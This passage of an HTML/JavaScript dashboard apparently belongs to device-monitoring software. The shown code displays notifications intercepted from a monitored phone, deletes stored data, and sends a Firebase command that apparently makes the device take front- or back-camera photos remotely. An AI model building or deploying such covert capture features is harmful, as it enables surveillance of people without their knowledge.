5.117-2.292 5.117-5.117-2.292-5.117-5.117-5.117zm0 8.792c-2.03 0-3.675-1.645-3.675-3.675s1.645-3.675 3.675-3.675 3.675 1.645 3.675 3.675-1.645 3.675-3.675 3.675zM18.833 6.167a1.44 1.44 0 1 1-2.88 0 1.44 1.44 0 0 1 2.88 0z" fill="url(#instagram-gradient)"/></svg>`;
                                }
                                contentHTML += `<div class="notification-card"><div class="notification-header"><div class="notification-icon">${appIcon}</div><strong class="notification-title">${notif.title || 'Notification'}</strong></div><p class="notification-body">${notif.text || ''}</p><div class="notification-footer">${notif.dateTime || ''}</div></div>`;
                            }
                        });
                        contentHTML += '</div>';
                        break;
                }
            }
            modalDataDisplayArea.innerHTML = headerHTML + contentHTML;
        }

        modalDataDisplayArea.addEventListener('click', (e) => {
            const button = e.target.closest('button');
            if (!button) return;
            const { userId, childKey, userName } = selectedUserInfo;
            if (button.classList.contains('clear-category-btn')) {
                const category = button.dataset.category;
                if (confirm(`Are you sure you want to delete all ${category} data for '${userName}'?`)) {
                    if (category === 'photo') {
                        clearAllPhotos(userId, childKey);
                    } else {
                        remove(ref(db, `user/${userId}/${childKey}/${getCategoryPath(category)}`));
                    }
                }
            }
            if (button.classList.contains('capture-photo-btn')) {
                const facing = button.dataset.facing;
                if(facing !== undefined) {
                    update(ref(db, `user/${userId}/${childKey}/photo/params`), { capturePhoto: true, facingPhoto: parseInt(facing) });
                }
            }
            if (button.id === 'refresh-photos-btn') { 
                displayCategoryData('photo'); 
            }
        });

        async function clearAllPhotos(userId, childKey) {
            const photoStoragePath = `user/${userId}/${childKey}/photo`;
            if (!confirm(`Are you sure you want to delete all photos for '${selectedUserInfo.userName}'? This cannot be undone.`)) return;
            modalDataDisplayArea.innerHTML = '<div class="loader"></div><p>Deleting photos...</p>';
            try {
                const photoDirRef = storageRef(storage, photoStoragePath);
                const res = await listAll(photoDirRef);
                await Promise.all(res.items.map(itemRef => deleteObject(itemRef)));
                await remove(ref(db, `user/${userId}/${childKey}/photo/data`));
                alert('All photos have been deleted.');
                displayCategoryData('photo');
            } catch (error) {
                console.error("Error clearing photos:", error);
                alert("Error clearing photos.");
                displayCategoryData('photo');
            }
        }

        menuBtn.addEventListener('click', () => sidebar.classList.add('open'));
        overlay.addEventListener('click', () => sidebar.classList.remove('open'));
        modalCloseBtn.addEventListener('click', () => {
            if (activeDataListener) { activeDataListener(); activeDataListener = null; }
            dataModal.style.display = 'none';
        });
    </script>
</body>
</html>
